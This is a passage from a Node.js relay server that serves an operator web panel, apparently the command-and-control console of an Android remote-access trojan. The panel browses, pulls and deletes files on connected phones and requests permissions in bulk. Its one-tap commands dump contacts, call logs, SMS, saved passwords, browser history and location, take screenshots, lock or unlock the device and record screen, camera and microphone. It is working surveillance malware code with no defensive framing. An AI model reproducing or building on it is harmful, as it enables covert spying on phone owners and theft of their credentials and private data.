    var now = actx.currentTime; if (apos < now) apos = now;
    s.start(apos); apos += b.duration;
  } catch (_) {}
}

/* ---------- files ---------- */

function buildFiles(){
  body.innerHTML = '<div id=fbar><div class=ib id=up>⬆</div><div id=fpath>/</div>' +
    '<div class=ib id=paste style="display:none">📋</div><div class=ib id=mk>➕</div>' +
    '<label class=ib for=fup>📤</label><div class=ib id=rf>⟳</div></div>' +
    '<input id=fup type=file multiple style="display:none"><div id=flist class=pad></div>';
  $('#up').onclick = function(){ load(curUp || ''); };
  $('#mk').onclick = function(){ var n = prompt('folder name'); if (!n) return;
    tx({ t: 'fs_mkdir', p: curPath, n: n }); setTimeout(function(){ load(curPath); }, 700); };
  $('#rf').onclick = function(){ load(curPath); };
  $('#fup').onchange = function(e){ upload(e.target.files, e.target); };
  $('#paste').onclick = function(){ if (!clip) return;
    var t = clip.op === 'move' ? 'fs_move' : 'fs_copy';
    tx({ t: t, p: clip.p, d: curPath });
    toast(clip.op + ' → here'); clip = null; $('#paste').style.display = 'none';
    setTimeout(function(){ load(curPath); }, 900); };
  load('');
}

function load(p){ tx({ t: 'fs_list', p: p || '' }); }

function renderFiles(m){
  if (m.err){ toast('cannot open'); return; }
  curPath = m.p;
  curUp = m.up || '';
  $('#fpath').textContent = m.path;
  var box = $('#flist');
  box.innerHTML = '';
  if (!m.items.length){ box.innerHTML = '<div style="color:#7b8aa3">empty folder</div>'; return; }
  m.items.forEach(function(it){
    var row = document.createElement('div');
    row.className = 'row';
    var ic = document.createElement('div');
    ic.className = 'ic';
    ic.textContent = it.d ? '📁' : it.i ? '🖼' : it.v ? '🎬' : it.a ? '🎵' : '📄';
    var nm = document.createElement('div');
    nm.className = 'rn'; nm.textContent = it.n;
    var sz = document.createElement('div');
    sz.className = 'rs'; sz.textContent = it.d ? '' : fmt(it.s);
    var mn = document.createElement('div');
    mn.className = 'mn'; mn.textContent = '⋯';
    mn.onclick = function(ev){ ev.stopPropagation(); menu(it); };
    row.append(ic, nm, sz, mn);
    row.onclick = function(){
      if (it.d) load(it.p);
      else if (it.i || it.v || it.a) tx({ t: 'fs_get', p: it.p, inline: true });
      else tx({ t: 'fs_get', p: it.p });
    };
    box.appendChild(row);
  });
}

function menu(it){
  $('#stitle').textContent = it.n;
  var box = $('#mitems');
  box.innerHTML = '';
  function add(l, fn, rd){ var d = document.createElement('div');
    d.className = 'mi' + (rd ? ' rd' : ''); d.textContent = l;
    d.onclick = function(){ $('#sheet').classList.remove('on'); fn(); };
    box.appendChild(d); }
  if (!it.d && (it.i || it.v || it.a)) add('👁 Open', function(){ tx({ t: 'fs_get', p: it.p, inline: true }); });
  if (!it.d) add('⬇ Download', function(){ tx({ t: 'fs_get', p: it.p }); });
  add('✏ Rename', function(){ var n = prompt('new name', it.n); if (!n) return;
    tx({ t: 'fs_rename', p: it.p, n: n }); setTimeout(function(){ load(curPath); }, 800); });
  add('📋 Copy', function(){ clip = { op: 'copy', p: it.p };
    $('#paste').style.display = 'flex'; toast('copied — paste where you want'); });
  add('✂ Move', function(){ clip = { op: 'move', p: it.p };
    $('#paste').style.display = 'flex'; toast('move — paste where you want'); });
  add('🗜 Zip', function(){ tx({ t: 'fs_zip', p: it.p }); toast('zipping…');
    setTimeout(function(){ load(curPath); }, 1500); });
  add('🗑 Delete', function(){ if (!confirm('Delete ' + it.n + ' ?')) return;
    tx({ t: 'fs_del', p: it.p }); setTimeout(function(){ load(curPath); }, 800); }, true);
  $('#sheet').classList.add('on');
}

function upload(files, input){
  var arr = [].slice.call(files), i = 0;
  (function next(){
    if (i >= arr.length){ input.value = ''; load(curPath); return; }
    var f = arr[i++], CH = 65536, off = 0;
    tx({ t: 'up_begin', p: curPath, n: f.name, size: f.size });
    var rd = new FileReader();
    rd.onload = function(){
      bin(10, rd.result);
      off += CH;
      if (off < f.size) rd.readAsArrayBuffer(f.slice(off, off + CH));
      else { tx({ t: 'up_end', p: curPath, n: f.name }); next(); }
    };
    rd.readAsArrayBuffer(f.slice(0, CH));
  })();
}

function gotChunk(pay){ if (dlCur) dlCur.parts.push(pay.slice()); }

function showModal(blob, name, mime){
  var u = URL.createObjectURL(blob);
  $('#mname').textContent = name || '';
  var mb = $('#mb');
  if ((mime || '').indexOf('video') === 0) mb.innerHTML = '<video src="' + u + '" controls autoplay playsinline></video>';
  else if ((mime || '').indexOf('audio') === 0) mb.innerHTML = '<audio src="' + u + '" controls autoplay></audio>';
  else mb.innerHTML = '<img src="' + u + '">';
  $('#modal').classList.add('on');
  $('#mx').onclick = function(){ $('#modal').classList.remove('on'); $('#mb').innerHTML = '';
    URL.revokeObjectURL(u); };
}

/* ---------- permissions ---------- */

function buildPerms(){
  body.innerHTML = '<div class=pad><div class="b big-b" id=pa style="margin-bottom:12px">▶️ Request all missing</div>' +
    '<div id=plist>loading…</div></div>';
  $('#pa').onclick = function(){
    var miss = document.querySelectorAll('.per .st[data-no]');
    var i = 0;
    (function step(){
      if (i >= miss.length){ toast('done'); setTimeout(function(){ tx({ t: 'perm_list' }); }, 1200); return; }
      var idx = parseInt(miss[i++].dataset.no, 10);
      tx({ t: 'perm_open', i: idx });
      setTimeout(step, 1500);
    })();
  };
  tx({ t: 'perm_list' });
}

function renderPerms(m){
  var box = $('#plist'); if (!box) return;
  box.innerHTML = '';
  (m.items || []).forEach(function(it){
    var row = document.createElement('div');
    row.className = 'per';
    var nm = document.createElement('div');
    nm.className = 'nm'; nm.textContent = it.n;
    var st = document.createElement('div');
    st.className = 'st';
    if (it.ok){ st.textContent = '✅'; }
    else { st.textContent = '❌'; st.dataset.no = it.i; }
    row.append(nm, st);
    if (!it.ok){
      var b = document.createElement('div');
      b.className = 'b'; b.style.cssText = 'flex:0 0 74px;height:30px;font-size:11px';
      b.textContent = 'Request';
      b.onclick = function(){ tx({ t: 'perm_open', i: it.i });
        setTimeout(function(){ tx({ t: 'perm_list' }); }, 1400); };
      row.appendChild(b);
    }
    box.appendChild(row);
  });
}

/* ---------- info ---------- */

function buildInfo(){ body.innerHTML = '<div class=info id=ib>loading…</div>'; tx({ t: 'dev_info' }); }

function renderInfo(m){
  var el = $('#ib'); if (!el) return;
  el.innerHTML = '<b>Model</b><br>' + esc(m.model || '?') + '<br><br><b>Brand</b><br>' + esc(m.brand || '?') +
    '<br><br><b>Android</b><br>' + esc(m.android || '?') + '<br><br><b>Battery</b><br>' + esc(m.batt) +
    '%<br><br><b>Free</b><br>' + esc(m.free) + '<br><br><b>Accessibility</b><br>' +
    (m.acc ? '✅' : '❌') + '<br><br><b>Camera</b><br>' + (m.cam ? '✅' : '❌') +
    '<br><br><b>Mic</b><br>' + (m.mic ? '✅' : '❌') + '<br><br><b>Locked</b><br>' +
    (m.locked ? '✅' : '❌');
}

/* ---------- console ---------- */

function buildConsole(){
  body.innerHTML = '<div id=log></div><div id=qk></div><div id=cin>' +
    '<input id=ct placeholder="command…"><div class=b id=cs style="max-width:56px">↵</div></div>';
  var qk = $('#qk');
  [['/info','Info'],['/contacts','Contacts'],['/calls','Call log'],['/sms','SMS'],
   ['/passwords','Vault'],['/checkpermission','Perms'],['/location','Location'],
   ['/wifi_info','WiFi'],['/scan_networks','Scan'],['/apps','Apps'],['/battery','Battery'],
   ['/usage_analytics','Usage'],['/browser_history','History'],['/screenshot','Shot'],
   ['/lock','Lock'],['/unlock','Unlock'],['/mute_on','Mute'],['/mute_off','Unmute'],
   ['/touch_on','Torch on'],['/touch_off','Torch off'],['/device_zip','ZIP'],
   ['/relay_test','Relay test'],['/relay_status','Relay stat'],
   ['/rec_30','Rec 30s'],['/screen_capture_off','Stop rec']
  ].forEach(function(p){
    var b = document.createElement('div');
    b.className = 'q'; b.textContent = p[1];
    b.onclick = function(){ send(p[0]); };
    qk.appendChild(b);
  });
  function send(v){ if (!v) return; log('>', v); tx({ t: 'cmd', v: v }); $('#ct').value = ''; }
  $('#cs').onclick = function(){ send($('#ct').value); };
  $('#ct').addEventListener('keydown', function(e){ if (e.key === 'Enter') send($('#ct').value); });
}

function log(kind, text){
  var l = $('#log'); if (!l) return;
  var e = document.createElement('div');
  e.className = 'e';
  e.innerHTML = '<div class=k>' + esc(kind) + '</div><pre>' + esc(text) + '</pre>';
  l.appendChild(e);
  if (view === 'console') body.scrollTop = body.scrollHeight;
}

function shot(){ if (!cur) return; tx({ t: 'shot' }); toast('screenshot…'); }

$('#back').onclick = leave;
$('#reload').onclick = function(){ location.reload(); };
$('#sheet').onclick = function(e){ if (e.target.id === 'sheet') $('#sheet').classList.remove('on'); };

window.addEventListener('pagehide', function(){
  if (screenOn) tx({ t: 'screen', on: false });
  if (camOn) tx({ t: 'cam', on: false });
  if (audioOn) tx({ t: 'audio', on: false });
  if (talkOn) tx({ t: 'talk', on: false });
});

conn();
</script></body></html>`;

/* ---------------- boot ---------------- */

server.on('error', (e) => {
  console.error('server', e.message);
  if (e.code === 'EADDRINUSE' || e.code === 'EACCES') process.exit(1);
});

server.listen(PORT, '0.0.0.0', () => console.log('relay on ' + PORT));

function shutdown() {
  clearInterval(ping);
  for (const d of devices.values()) { try { d.ws.close(); } catch (_) {} }
  try { wss.close(); } catch (_) {}
  try { server.close(); } catch (_) {}
  setTimeout(() => process.exit(0), 400);
}
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);